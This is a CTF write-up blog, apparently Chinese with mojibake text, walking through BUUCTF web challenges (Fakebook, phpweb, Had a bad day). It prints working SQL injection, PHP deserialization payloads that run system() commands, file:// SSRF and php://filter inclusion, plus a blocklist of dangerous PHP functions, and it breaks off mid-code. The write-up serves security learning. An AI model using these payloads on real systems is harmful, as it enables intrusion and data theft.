<h2 id="ç½‘é¼æ¯-2018-Fakebook"><a href="#ç½‘é¼æ¯-2018-Fakebook" class="headerlink" title="[ç½‘é¼æ¯ 2018]Fakebook"></a>[ç½‘é¼æ¯ 2018]Fakebook</h2><p>çœ‹åˆ°æ³¨å†Œé¦–å…ˆæƒ³åˆ°äº†å­˜å‚¨å‹xssï¼Œä¸€é¡¿xè¿”å›çš„PHPSESSIDå¹¶æ²¡æœ‰ä»€ä¹ˆç”¨<br>æ­£å¸¸æ³¨å†Œblogå°±å¡«<code>www.baidu.com</code>æŠŠ<br>è‡ªåŠ¨è·³è½¬åˆ°ä¸‹ä¸€ä¸ªé¡µé¢åï¼Œå¯ä»¥å‘ç°usernameæ˜¯ä¸€ä¸ªè¶…é“¾æ¥<br>ç‚¹å‡»è¿›å…¥</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://c5d58095-<span class="hljs-number">7</span>b7c-<span class="hljs-number">4</span>cad-b014-<span class="hljs-number">237</span>ca4cccdcf.node4.buuoj.cn:<span class="hljs-number">81</span>/view.php?no=<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>

<p>ç–‘ä¼¼SQLæ³¨å…¥<br>è¿‡æ»¤äº†union select,ç”¨union all selectç»•è¿‡<br>payload:</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">?<span class="hljs-keyword">no</span>=<span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">all</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,data,<span class="hljs-number">3</span>,<span class="hljs-number">4</span> <span class="hljs-keyword">from</span> users<br></code></pre></td></tr></table></figure>

<p>usernameåˆ—è¿”å›<code>O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:3:&quot;age&quot;;i:12;s:4:&quot;blog&quot;;s:13:&quot;www.baidu.com&quot;;&#125; </code></p>
<p>å±äºæ˜¯è¢«åºåˆ—åŒ–äº†ï¼Œé‚£åº”è¯¥è¿˜æœ‰æˆ‘ä»¬åº”è¯¥çŸ¥é“çš„æºä»£ç æ²¡æœ‰æ‰¾åˆ°<br>dirsearchæ‰«ä¸€æ‰«<br>æ‰«å‡ºè¿™ä¹ˆå‡ ä¸ªèƒ½ç”¨çš„æ–‡ä»¶</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">/db.php<br>/error.php<br>/flag.php<br>/login.php<br>/robots.txt<br>/view.php<br></code></pre></td></tr></table></figure>
<p>è¿›å…¥&#x2F;robots.txtæ‰¾åˆ°&#x2F;user.php.bak<br>ä¸‹è½½<br>æºç </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">UserInfo</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span> = <span class="hljs-string">&quot;admin&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$age</span> = <span class="hljs-number">12</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$blog</span> = <span class="hljs-string">&quot;/var/www/html/flag.php&quot;</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>, <span class="hljs-variable">$age</span>, <span class="hljs-variable">$blog</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;name = <span class="hljs-variable">$name</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;age = (<span class="hljs-keyword">int</span>)<span class="hljs-variable">$age</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;blog = <span class="hljs-variable">$blog</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get</span>(<span class="hljs-params"><span class="hljs-variable">$url</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$ch</span> = <span class="hljs-title function_ invoke__">curl_init</span>();<span class="hljs-comment">//åˆå§‹åŒ–ä¸€ä¸ªcURLä¼šè¯</span><br><br>        <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_URL, <span class="hljs-variable">$url</span>);<span class="hljs-comment">//ä¸ºç»™å®šçš„cURLä¼šè¯å¥æŸ„è®¾ç½®ä¸€ä¸ªé€‰é¡¹</span><br>        <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="hljs-number">1</span>);<br>        <span class="hljs-variable">$output</span> = <span class="hljs-title function_ invoke__">curl_exec</span>(<span class="hljs-variable">$ch</span>);<span class="hljs-comment">//æ‰§è¡Œç»™å®šçš„cURLä¼šè¯</span><br>        <span class="hljs-variable">$httpCode</span> = <span class="hljs-title function_ invoke__">curl_getinfo</span>(<span class="hljs-variable">$ch</span>, CURLINFO_HTTP_CODE);<span class="hljs-comment">//è·å–ä¸€ä¸ªcURLè¿æ¥èµ„æºå¥æŸ„çš„ä¿¡æ¯</span><br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$httpCode</span> == <span class="hljs-number">404</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">404</span>;<br>        &#125;<br>        <span class="hljs-title function_ invoke__">curl_close</span>(<span class="hljs-variable">$ch</span>);<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$output</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getBlogContents</span> (<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">get</span>(<span class="hljs-variable">$this</span>-&gt;blog);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">isValidBlog</span> (<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$blog</span> = <span class="hljs-variable language_">$this</span>-&gt;blog;<br>        <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]&#123;2,6&#125;(\:[0-9]+)?(\/\S*)?$/i&quot;</span>, <span class="hljs-variable">$blog</span>);<br>    &#125;<br><br>&#125;<br><br></code></pre></td></tr></table></figure>
<p>éœ€è¦äº†è§£çš„</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-keyword">function</span> get(<span class="hljs-variable">$url</span>)<br>   &#123;<br>       <span class="hljs-variable">$ch</span> = curl_init();<span class="hljs-regexp">//</span>åˆå§‹åŒ–ä¸€ä¸ªcURLä¼šè¯<br><br>       curl_setopt(<span class="hljs-variable">$ch</span>, CURLOPT_URL, <span class="hljs-variable">$url</span>);<span class="hljs-regexp">//</span>ä¸ºç»™å®šçš„cURLä¼šè¯å¥æŸ„è®¾ç½®ä¸€ä¸ªé€‰é¡¹<br>       curl_setopt(<span class="hljs-variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="hljs-number">1</span>);<br>       <span class="hljs-variable">$output</span> = curl_exec(<span class="hljs-variable">$ch</span>);<span class="hljs-regexp">//</span>æ‰§è¡Œç»™å®šçš„cURLä¼šè¯<br>       <span class="hljs-variable">$httpCode</span> = curl_getinfo(<span class="hljs-variable">$ch</span>, CURLINFO_HTTP_CODE);<span class="hljs-regexp">//</span>è·å–ä¸€ä¸ªcURLè¿æ¥èµ„æºå¥æŸ„çš„ä¿¡æ¯<br>       <span class="hljs-keyword">if</span>(<span class="hljs-variable">$httpCode</span> == <span class="hljs-number">404</span>) &#123;<br>           return <span class="hljs-number">404</span>;<br>       &#125;<br>       curl_close(<span class="hljs-variable">$ch</span>);<br><br>       return <span class="hljs-variable">$output</span>;<br>   &#125;<br><br></code></pre></td></tr></table></figure>

<ul>
<li>curl_init ï¼š åˆå§‹åŒ–ä¸€ä¸ªcURLä¼šè¯ï¼Œä¾›curl_setopt(), curl_exec()å’Œcurl_close() å‡½æ•°ä½¿ç”¨ã€‚</li>
<li>curl_setopt ï¼š è¯·æ±‚ä¸€ä¸ªurlã€‚å…¶ä¸­CURLOPT_URLè¡¨ç¤ºéœ€è¦è·å–çš„URLåœ°å€ï¼Œåé¢å°±æ˜¯è·Ÿä¸Šäº†å®ƒçš„å€¼ã€‚</li>
<li>CURLOPT_RETURNTRANSFER å°†curl_exec()è·å–çš„ä¿¡æ¯ä»¥æ–‡ä»¶æµçš„å½¢å¼è¿”å›ï¼Œè€Œä¸æ˜¯ç›´æ¥è¾“å‡º</li>
<li>curl_execï¼ŒæˆåŠŸæ—¶è¿”å› TRUEï¼Œ æˆ–è€…åœ¨å¤±è´¥æ—¶è¿”å› FALSEã€‚ ç„¶è€Œï¼Œå¦‚æœ CURLOPT_RETURNTRANSFERé€‰é¡¹è¢«è®¾ç½®ï¼Œå‡½æ•°æ‰§è¡ŒæˆåŠŸæ—¶ä¼šè¿”å›æ‰§è¡Œçš„ç»“æœï¼Œå¤±è´¥æ—¶è¿”å› FALSE ã€‚</li>
<li>CURLINFO_HTTP_CODE ï¼šæœ€åä¸€ä¸ªæ”¶åˆ°çš„HTTPä»£ç ã€‚<br>curl_getinfoï¼šä»¥å­—ç¬¦ä¸²å½¢å¼è¿”å›å®ƒçš„å€¼ï¼Œå› ä¸ºè®¾ç½®äº†CURLINFO_HTTP_CODEï¼Œæ‰€ä»¥æ˜¯è¿”å›çš„çŠ¶æ€ç ã€‚</li>
</ul>
<p>å¦‚æœçŠ¶æ€ç ä¸æ˜¯404ï¼Œå°±è¿”å›execçš„ç»“æœã€‚<br>getå‡½æ•°åœ¨getBlogContents()é‡Œè¢«è°ƒç”¨ï¼Œä¼ å‚ä¸ºblog<br>ç»™å‚æ•°èµ‹ä¸ªå€¼ï¼Œååºåˆ—åŒ–çœ‹çœ‹flag.php</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-variable">$a</span>=new UserInfo();<br><span class="hljs-variable">$a</span>-&gt;<span class="hljs-attribute">name</span>=<span class="hljs-string">&#x27;admin&#x27;</span>;<br><span class="hljs-variable">$a</span>-&gt;<span class="hljs-attribute">age</span>=12;<br><span class="hljs-variable">$a</span>-&gt;<span class="hljs-attribute">blog</span>=<span class="hljs-string">&quot;file:///var/www/html/flag.php&quot;</span>;<br>echo serialize(<span class="hljs-variable">$a</span>);<br></code></pre></td></tr></table></figure>
<p>payload</p>
<figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">?no=-<span class="hljs-number">1</span> union <span class="hljs-keyword">all</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-symbol">&#x27;O</span>:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;UserInfo&quot;</span>:<span class="hljs-number">3</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;name&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;admin&quot;</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;age&quot;</span>;i:<span class="hljs-number">12</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;blog&quot;</span>;s:<span class="hljs-number">29</span>:<span class="hljs-string">&quot;file:///var/www/html/flag.php&quot;</span>;&#125;&#x27;<br></code></pre></td></tr></table></figure>
<p><img src="/images/WLVRMOO2ZVHZ1IHR1E.png" srcset="/img/loading.gif" lazyload><br>æŸ¥çœ‹æºä»£ç <br><img src="/images/FISBFG6M8XZVKJ8.png" srcset="/img/loading.gif" lazyload><br>base64è§£ç å°±å¯å¾—åˆ°flagäº†</p>
<h2 id="ç½‘é¼æ¯-2020-æœ±é›€ç»„-phpweb"><a href="#ç½‘é¼æ¯-2020-æœ±é›€ç»„-phpweb" class="headerlink" title="[ç½‘é¼æ¯ 2020 æœ±é›€ç»„]phpweb"></a>[ç½‘é¼æ¯ 2020 æœ±é›€ç»„]phpweb</h2><p>é¡µé¢ä¸€ç›´åœ¨åˆ·æ–°ï¼ŒæŠ“ä¸ªåŒ…å…ˆ<br><img src="/images/ZQSBGIA79FQDV2.png" srcset="/img/loading.gif" lazyload><br>POSTæ£€æŸ¥å‰é¢æ˜¯å‡½æ•°ï¼Œåé¢æ˜¯å‚æ•°<br>è¿™é‡Œeval(system(â€˜lsâ€™))ç”¨ä¸äº†äº†ï¼Œåº”è¯¥æ˜¯è¢«è¿‡æ»¤äº†<br>åº”è¯¥æ˜¯ç”¨äº†call_user_func()å‡½æ•°ï¼Œç”¨file_get_contentsçœ‹ä¸€ä¸‹æºä»£ç </p>
<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">func</span>=file_get_contents&amp;p=index.php<br></code></pre></td></tr></table></figure>
<p>æ‰¾åˆ°phpä»£ç </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-variable">$disable_fun</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;exec&quot;</span>,<span class="hljs-string">&quot;shell_exec&quot;</span>,<span class="hljs-string">&quot;system&quot;</span>,<span class="hljs-string">&quot;passthru&quot;</span>,<span class="hljs-string">&quot;proc_open&quot;</span>,<span class="hljs-string">&quot;show_source&quot;</span>,<span class="hljs-string">&quot;phpinfo&quot;</span>,<span class="hljs-string">&quot;popen&quot;</span>,<span class="hljs-string">&quot;dl&quot;</span>,<span class="hljs-string">&quot;eval&quot;</span>,<span class="hljs-string">&quot;proc_terminate&quot;</span>,<span class="hljs-string">&quot;touch&quot;</span>,<span class="hljs-string">&quot;escapeshellcmd&quot;</span>,<span class="hljs-string">&quot;escapeshellarg&quot;</span>,<span class="hljs-string">&quot;assert&quot;</span>,<span class="hljs-string">&quot;substr_replace&quot;</span>,<span class="hljs-string">&quot;call_user_func_array&quot;</span>,<span class="hljs-string">&quot;call_user_func&quot;</span>,<span class="hljs-string">&quot;array_filter&quot;</span>, <span class="hljs-string">&quot;array_walk&quot;</span>,  <span class="hljs-string">&quot;array_map&quot;</span>,<span class="hljs-string">&quot;registregister_shutdown_function&quot;</span>,<span class="hljs-string">&quot;register_tick_function&quot;</span>,<span class="hljs-string">&quot;filter_var&quot;</span>, <span class="hljs-string">&quot;filter_var_array&quot;</span>, <span class="hljs-string">&quot;uasort&quot;</span>, <span class="hljs-string">&quot;uksort&quot;</span>, <span class="hljs-string">&quot;array_reduce&quot;</span>,<span class="hljs-string">&quot;array_walk&quot;</span>, <span class="hljs-string">&quot;array_walk_recursive&quot;</span>,<span class="hljs-string">&quot;pcntl_exec&quot;</span>,<span class="hljs-string">&quot;fopen&quot;</span>,<span class="hljs-string">&quot;fwrite&quot;</span>,<span class="hljs-string">&quot;file_put_contents&quot;</span>);<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">gettime</span>(<span class="hljs-params"><span class="hljs-variable">$func</span>, <span class="hljs-variable">$p</span></span>) </span>&#123;<br>        <span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">call_user_func</span>(<span class="hljs-variable">$func</span>, <span class="hljs-variable">$p</span>);<br>        <span class="hljs-variable">$a</span>= <span class="hljs-title function_ invoke__">gettype</span>(<span class="hljs-variable">$result</span>);<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$a</span> == <span class="hljs-string">&quot;string&quot;</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-variable">$result</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span>;&#125;<br>    &#125;<br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span> </span>&#123;<br>        <span class="hljs-keyword">var</span> <span class="hljs-variable">$p</span> = <span class="hljs-string">&quot;Y-m-d h:i:s a&quot;</span>;<br>        <span class="hljs-keyword">var</span> <span class="hljs-variable">$func</span> = <span class="hljs-string">&quot;date&quot;</span>;<br>        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;func != <span class="hljs-string">&quot;&quot;</span>) &#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">gettime</span>(<span class="hljs-variable">$this</span>-&gt;func, <span class="hljs-variable">$this</span>-&gt;p);<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-variable">$func</span> = <span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&quot;func&quot;</span>];<br>    <span class="hljs-variable">$p</span> = <span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&quot;p&quot;</span>];<br><br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$func</span> != <span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-variable">$func</span> = <span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-variable">$func</span>);<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$func</span>,<span class="hljs-variable">$disable_fun</span>)) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">gettime</span>(<span class="hljs-variable">$func</span>, <span class="hljs-variable">$p</span>);<br>        &#125;<span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Hacker...&quot;</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
<p>è¿‡æ»¤äº†å¾ˆå¤šå‡½æ•°ï¼Œç”¨ååºåˆ—åŒ–è¯•è¯•</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span> </span>&#123;<br>    <span class="hljs-keyword">var</span> <span class="hljs-variable">$p</span> = <span class="hljs-string">&quot;ls&quot;</span>;<br>    <span class="hljs-keyword">var</span> <span class="hljs-variable">$func</span> = <span class="hljs-string">&quot;system&quot;</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;func != <span class="hljs-string">&quot;&quot;</span>) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">gettime</span>(<span class="hljs-variable">$this</span>-&gt;func, <span class="hljs-variable">$this</span>-&gt;p);<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Test</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">//O:4:&quot;Test&quot;:2:&#123;s:1:&quot;p&quot;;s:2:&quot;ls&quot;;s:4:&quot;func&quot;;s:6:&quot;system&quot;;&#125;</span><br></code></pre></td></tr></table></figure>
<p>payload</p>
<figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-attr">func</span><span class="hljs-operator">=</span>unserialize<span class="hljs-variable">&amp;p</span>=O:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;Test&quot;</span>:<span class="hljs-number">2</span>:<span class="hljs-punctuation">&#123;</span>s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;p&quot;</span><span class="hljs-punctuation">;</span>s:<span class="hljs-number">2</span>:<span class="hljs-string">&quot;ls&quot;</span><span class="hljs-punctuation">;</span>s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;func&quot;</span><span class="hljs-punctuation">;</span>s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;system&quot;</span><span class="hljs-punctuation">;</span><span class="hljs-punctuation">&#125;</span><br><span class="hljs-comment">//bg.jpg index.php index.php</span><br><br><span class="hljs-attr">func</span><span class="hljs-operator">=</span>unserialize<span class="hljs-variable">&amp;p</span>=O:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;Test&quot;</span>:<span class="hljs-number">2</span>:<span class="hljs-punctuation">&#123;</span>s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;p&quot;</span><span class="hljs-punctuation">;</span>s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;ls /&quot;</span><span class="hljs-punctuation">;</span>s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;func&quot;</span><span class="hljs-punctuation">;</span>s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;system&quot;</span><span class="hljs-punctuation">;</span><span class="hljs-punctuation">&#125;</span><br><span class="hljs-comment">//bin boot dev etc home lib lib64 media mnt opt proc root run sbin srv start.sh sys tmp usr var</span><br></code></pre></td></tr></table></figure>
<p>flagåº”è¯¥æ˜¯è—åˆ°äº†æ›´éšè”½çš„ä½ç½®</p>
<p>ç”¨findå‘½ä»¤å…¨å±€æŸ¥æ‰¾<br>payload:</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">func</span>=unserialize&amp;p=O:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;Test&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;p&quot;</span>;s:<span class="hljs-number">18</span>:<span class="hljs-string">&quot;find / -name flag*&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;func&quot;</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;system&quot;</span>;&#125;<br></code></pre></td></tr></table></figure>
<p><img src="/images/XR86EVQQXJ4OGAGCIE6.png" srcset="/img/loading.gif" lazyload><br>&#x2F;tmp&#x2F;flagoefiu4r93æ˜¯flagçš„æ­£ç¡®ä½ç½®<br>payload:</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-keyword">func</span>=unserialize&amp;p=O:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;Test&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;p&quot;</span>;s:<span class="hljs-number">22</span>:<span class="hljs-string">&quot;cat /tmp/flagoefiu4r93&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;func&quot;</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;system&quot;</span>;&#125;<br><span class="hljs-regexp">//</span>flag&#123;d9827631-f2f1-<span class="hljs-number">407</span>b-<span class="hljs-number">9</span>ee9-<span class="hljs-number">5</span>fc84da1246a&#125;<br></code></pre></td></tr></table></figure>
<p>ç”¨readfileä¹Ÿå¯ä»¥<br>payload:</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">func</span>=readfile&amp;p=/tmp/flagoefiu4r93<br><br><span class="hljs-attribute">or</span><br><br><span class="hljs-attribute">func</span>=unserialize&amp;p=O:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;Test&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;p&quot;</span>;s:<span class="hljs-number">18</span>:<span class="hljs-string">&quot;/tmp/flagoefiu4r93&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;func&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;readfile&quot;</span>;&#125;<br></code></pre></td></tr></table></figure>

<h2 id="BSidesCF-2020-Had-a-bad-day"><a href="#BSidesCF-2020-Had-a-bad-day" class="headerlink" title="[BSidesCF 2020]Had a bad day"></a>[BSidesCF 2020]Had a bad day</h2><p>æºä»£ç æ²¡æœ‰é€æ¼å‡ºä»€ä¹ˆæœ‰ç”¨çš„ä¿¡æ¯<br>éšä¾¿è¿›å…¥ä¸€ä¸ªé€‰é¡¹<br>çœ‹äº†çœ‹urlæ ï¼Œ?category&#x3D;woofersï¼Œåº”è¯¥å­˜åœ¨sqlæ³¨å…¥<br><img src="/images/VR1N6OQCRZJXPPOO7AQX.png" srcset="/img/loading.gif" lazyload><br>æŠ¥é”™ä¿¡æ¯æå–åˆ°includeï¼Œå’ŒåŠ äº†.phpåç¼€<br>includeçš„è¯æˆ‘ä»¬ä½¿ç”¨ä¼ªåè®®<br>payload:</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">?category=php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/convert.base64-encode/</span>resource=index<br></code></pre></td></tr></table></figure>
<p>è¿”å›ä¸€å¤§ä¸²base64ç¼–ç è§£ç åæŸ¥çœ‹æºç <br>æºç ä¸­å¤¹æ‚äº†phpä»£ç </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>			<span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;category&#x27;</span>];<br><br>			<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$file</span>))<br>			&#123;<br>				<span class="hljs-keyword">if</span>( <span class="hljs-title function_ invoke__">strpos</span>( <span class="hljs-variable">$file</span>, <span 